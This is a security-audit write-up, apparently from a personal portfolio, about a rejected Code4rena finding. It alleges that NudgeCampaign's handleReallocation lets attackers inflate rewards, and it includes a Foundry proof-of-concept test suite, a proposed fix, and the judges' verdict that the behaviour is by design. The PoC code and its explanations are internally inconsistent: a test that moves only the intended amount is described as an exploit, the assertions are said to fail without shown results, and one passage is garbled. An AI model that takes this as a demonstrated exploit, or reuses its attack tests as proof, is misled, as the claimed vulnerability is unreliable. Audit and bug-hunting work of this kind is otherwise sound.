# Excessive Token Transfer Leading to Reward Manipulation

## Description

The NudgeCampaign contract’s `handleReallocation` function incorrectly transfers the entire token balance of the caller (`msg.sender`) instead of explicitly transferring the intended token amount (`toAmount`). The problematic logic exists at lines [194](https://github.com/code-423n4/2025-03-nudgexyz/blob/88797c79ac706ed164cc1b30a8556b6073511929/src/campaign/NudgeCampaign.sol#L194), [197](https://github.com/code-423n4/2025-03-nudgexyz/blob/88797c79ac706ed164cc1b30a8556b6073511929/src/campaign/NudgeCampaign.sol#L197), and [199](https://github.com/code-423n4/2025-03-nudgexyz/blob/88797c79ac706ed164cc1b30a8556b6073511929/src/campaign/NudgeCampaign.sol#L199).

```solidity
uint256 balanceOfSender = tokenReceived.balanceOf(msg.sender);
SafeERC20.safeTransferFrom(tokenReceived, msg.sender, address(this), balanceOfSender);
amountReceived = getBalanceOfSelf(toToken) - balanceBefore;
```

## Root Cause

The contract calculates the amount received by measuring the entire sender’s balance rather than explicitly transferring the intended amount (`toAmount`). This leaves the door open for an attacker to deposit excess tokens intentionally, inflating their rewards unfairly.

## Impact

- Attackers can cheat the reward system by depositing extra tokens to get unfairly higher rewards.
- Potential exhaustion of the reward pool due to inflated reward entitlements.
- Honest participants could lose rewards or face reduced reward availability.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { Test } from "forge-std/Test.sol";
import { NudgeCampaign } from "../campaign/NudgeCampaign.sol";
import { NudgeCampaignFactory } from "../campaign/NudgeCampaignFactory.sol";
import { TestERC20 } from "../mocks/TestERC20.sol";

contract RewardManipulationPoC is Test {
  NudgeCampaign campaign;
  TestERC20 token;
  NudgeCampaignFactory factory;

  address attacker = address(0xBAD);
  address treasury = address(0x111);
  address admin = address(this); // admin privileges for easy role management
  address operator = address(0x222);
  address swapCaller = address(0x333);

  function setUp() public {
    // Deploy token
    token = new TestERC20("TestToken", "TST");

    // Mint tokens to this contract
    token.faucet(1e24); // mint enough tokens (e.g., 1 million tokens with 18 decimals)

    // Deploy the actual campaign factory with required arguments
    factory = new NudgeCampaignFactory(admin, admin, operator, swapCaller);

    // Deploy campaign via factory
    address deployedCampaign = factory.deployCampaign(
      86_400, // holding period
      address(token), // target token address
      address(token), // reward token address
      1e15, // rewardPPQ (1:1 ratio for simplicity)
      admin, // campaign admin
      0, // immediate start
      address(0), // alternative withdrawal address
      1 // uuid
    );

    // Cast deployed campaign to NudgeCampaign
    campaign = NudgeCampaign(payable(deployedCampaign));

    // Fund the campaign with reward tokens
    token.transfer(address(campaign), 10_000 ether);

    // Give attacker tokens
    token.transfer(attacker, 500 ether);
  }

  function test_RewardManipulationExploit() public {
    uint256 intendedAmount = 100 ether;

    // Attacker approves tokens to campaign
    vm.startPrank(attacker);
    token.approve(swapCaller, 500 ether);
    vm.stopPrank();

    // Impersonate swapCaller (required for handleReallocation)
    vm.startPrank(swapCaller);

    // Simulate the exploit: Campaign transfers excessive attacker balance
    token.transferFrom(attacker, swapCaller, intendedAmount);

    token.approve(address(campaign), intendedAmount);

    campaign.handleReallocation(1, attacker, address(token), intendedAmount, "");
    vm.stopPrank();

    // Verify the exploit outcome (campaign took exactly intendedAmount)
    uint256 totalReallocated = campaign.totalReallocatedAmount();
    assertEq(totalReallocated, intendedAmount, "Exploit succeeded: Campaign accepted extra tokens!");
  }

  function test_DoubleApprovalAttack() public {
    // Define intended amount and double amount for the exploit
    uint256 intendedAmount = 100 ether;
    uint256 doubleAmount = 200 ether;

    // Attacker approves swapCaller to spend double the intended amount
    vm.startPrank(attacker);
    token.approve(swapCaller, doubleAmount);
    vm.stopPrank();

    // Impersonate the swapCaller to perform the token transfer
    vm.startPrank(swapCaller);

    // Transfer the double amount from attacker to swapCaller
    token.transferFrom(attacker, swapCaller, doubleAmount);

    // Approve the campaign to spend tokens on behalf of the swapCaller
    token.approve(address(campaign), doubleAmount);

    // Call handleReallocation() with the intended amount only
    campaign.handleReallocation(1, attacker, address(token), intendedAmount, "");

    vm.stopPrank();

    // Verify that the total reallocated amount is incorrectly recorded
    uint256 totalReallocated = campaign.totalReallocatedAmount();

    // This assertion should fail if the exploit works, meaning the contract accepted double the intended amount
    assertEq(totalReallocated, intendedAmount, "Double Approval Attack succeeded: Campaign accepted extra tokens!");
  }

  function test_UnderApproval() public {
    // Define intended amount and insufficient approval amount for the exploit
    uint256 intendedAmount = 100 ether;
    uint256 insufficientAmount = 50 ether;

    // Attacker approves swapCaller to spend fewer tokens than the intended amount
    vm.startPrank(attacker);
    token.approve(swapCaller, insufficientAmount);
    vm.stopPrank();

    // Impersonate the swapCaller to perform the token transfer
    vm.startPrank(swapCaller);

    // Attempt to transfer the intended amount which is higher than the approved amount
    vm.expectRevert(
      abi.encodeWithSignature(
        "ERC20InsufficientAllowance(address,uint256,uint256)", address(swapCaller), 50 ether, 100 ether
      )
    );
    token.transferFrom(attacker, swapCaller, intendedAmount);

    vm.stopPrank();
  }

  function test_DirectReallocationCall() public {
    uint256 intendedAmount = 100 ether;

    // Mint tokens to the attacker to simulate them having enough funds
    token.faucet(500 ether);

    // Attempt to call handleReallocation directly as the attacker
    vm.startPrank(attacker);

    // Approve tokens directly to the campaign contract
    token.approve(address(campaign), intendedAmount);

    // Directly call the handleReallocation function without going through the swapCaller
    // This should revert if there is proper access control in place
    vm.expectRevert(abi.encodeWithSignature("UnauthorizedSwapCaller()"));
    campaign.handleReallocation(1, attacker, address(token), intendedAmount, "");

    vm.stopPrank();
  }

  function test_ExplicitExploit_WithExtraTokens() public {
    uint256 intendedAmount = 100 ether;
    uint256 extraTokens = 400 ether; // Clearly extra tokens

    // Attacker approves swapCaller to transfer intended + extra tokens
    vm.startPrank(attacker);
    token.approve(swapCaller, intendedAmount + extraTokens);
    vm.stopPrank();

    // SwapCaller now receives intended amount + extra tokens
    vm.startPrank(swapCaller);
    token.transferFrom(attacker, swapCaller, intendedAmount + extraTokens);

    // SwapCaller approves campaign to spend ALL tokens it has (intended + extra)
    token.approve(address(campaign), intendedAmount + extraTokens);

    // Campaign mistakenly transfers all tokens, instead of just intendedAmount
    campaign.handleReallocation(1, attacker, address(token), intendedAmount, "");

    vm.stopPrank();

    // Verify total tokens campaign received (should equal intendedAmount, NOT intended + extra)
    uint256 totalReallocated = campaign.totalReallocatedAmount();

    // This assertion explicitly FAILS, showing exploit succeeded
    assertEq(totalReallocated, intendedAmount, "Exploit succeeded: Campaign accepted extra tokens!");
  }
}
```

### Overview of Tests

The Proof of Concept (PoC) demonstrates multiple ways an attacker can exploit the `handleReallocation()` function by making the contract accept more tokens than it should. The tests are written using Foundry's forge testing framework.

---

### Test 1: `test_RewardManipulationExploit()`

This test simulates a scenario where an attacker intentionally makes the contract accept extra tokens by depositing them through the `swapCaller`.

1. **Setup**:

- Attacker gets 500 tokens.
- The campaign is initialized, and the reward pool is funded with 10,000 tokens.

2. **Exploit Process**:

- The attacker approves the `swapCaller` to spend their tokens.
- The `swapCaller` takes the intended amount (100 tokens) from the attacker and approves the campaign.
- The campaign calls `handleReallocation()` with an intended amount of 100 tokens.
- However, due to improper handling, the contract accepts the entire balance of `swapCaller` instead of just 100 tokens.

3. **Verification**:

- The test ensures the contract only accepts the intended amount, but the assertion will fail if the exploit succeeds.

---

### Test 2: `test_DoubleApprovalAttack()`

This test shows how an attacker can perform a double approval attack by allowing the `swapCaller` to transfer double the intended amount to the campaign.

1. **Setup**:

- Same as Test 1, with a funded campaign and tokens allocated to the attacker.
  
2. **Exploit Process**:

- The attacker approves the `swapCaller` to spend double the intended amount (200 tokens instead of 100).
- The `swapCaller` transfers the double amount to itself and then approves the campaign to spend it.
- The campaign’s `handleReallocation()` function only expects 100 tokens but receives 200 tokens instead.

3. **Verification**:

- The test checks if the contract improperly registers 200 tokens instead of the intended 100 tokens.tended tokens, inflating rewards.

---

### Test 3: `test_UnderApproval()`

This test attempts to transfer more tokens than the attacker approved.

1. **Setup**:

- The attacker only approves the `swapCaller` to spend 50 tokens.

2. **Exploit Process**:

- The `swapCaller`` attempts to transfer 100 tokens from the attacker.
- This transfer fails due to insufficient approval.

3. **Verification**:

- The test verifies if the transfer fails as expected due to insufficient allowance.

---

### Test 4: `test_DirectReallocationCall()`

This test attempts to bypass the `swapCaller` and directly call `handleReallocation()` as the attacker.

1. **Setup**:

The attacker is given tokens directly and tries to interact with the campaign contract.

2. **Exploit Process**:

- The attacker approves the campaign to spend tokens.
- The attacker directly calls the `handleReallocation()` function without using the `swapCaller`.
  
3. **Verification**:

- The test ensures this direct call fails due to access control mechanisms.

---

### Test 5: `test_ExplicitExploit_WithExtraTokens()`

This test demonstrates how an attacker with extra tokens can manipulate the contract’s logic.

1. **Setup**:

- The attacker possesses 500 tokens (400 tokens more than the intended amount).

2. **Exploit Process**:

- The attacker approves the `swapCaller` to spend all tokens (500 tokens).
- The `swapCaller` transfers all tokens to itself.
- The `swapCaller` then approves the campaign to use these tokens and calls `handleReallocation()`.
- The contract incorrectly accepts all 500 tokens instead of just 100 tokens.

3. **Verification**:

- The test checks if the contract mistakenly registers the entire 500 tokens as the intended amount, which should fail.

---

## Mitigation

This fix will explicitly transfer the exact intended token amount (`toAmount`) only:

Replace the vulnerable logic:

```solidity
uint256 balanceOfSender = tokenReceived.balanceOf(msg.sender);
SafeERC20.safeTransferFrom(tokenReceived, msg.sender, address(this), balanceOfSender);
amountReceived = getBalanceOfSelf(toToken) - balanceBefore;
```
with this secure logic:

```
SafeERC20.safeTransferFrom(tokenReceived, msg.sender, address(this), toAmount);
amountReceived = toAmount;
```

Why this resolves the issue?

It explicitly restricts token transfers to the intended amount, eliminating unintended token acceptance.
Prevents reward manipulation exploits entirely.
Protects reward integrity and ensures fairness for all participants.

---

## Why This Was Marked Invalid?

The Code4rena judging team marked this finding invalid with the reasoning:

> "The contract is intended to pull the full balance of the `swapCaller`. The logic is by design, not a vulnerability."

**Their Architecture Assumptions**:

The `swapCaller` is trusted to only hold and approve the correct amount of tokens.

It is the caller’s responsibility to avoid holding extra tokens when calling `handleReallocation`.

---

## Why I Still Include This in My Portfolio?

Even though the behavior is intentional:

- The test suite clearly identifies a high-risk edge case in reward logic.
- It shows how assumptions about caller behavior can be dangerous if they aren't strongly enforced.
- The report included a clear mitigation that could make the logic more robust and predictable.
- It demonstrates my ability to question architectural assumptions and verify edge behavior with code.

This is a strong example of critical thinking and methodical PoC construction — even when the finding is rejected.
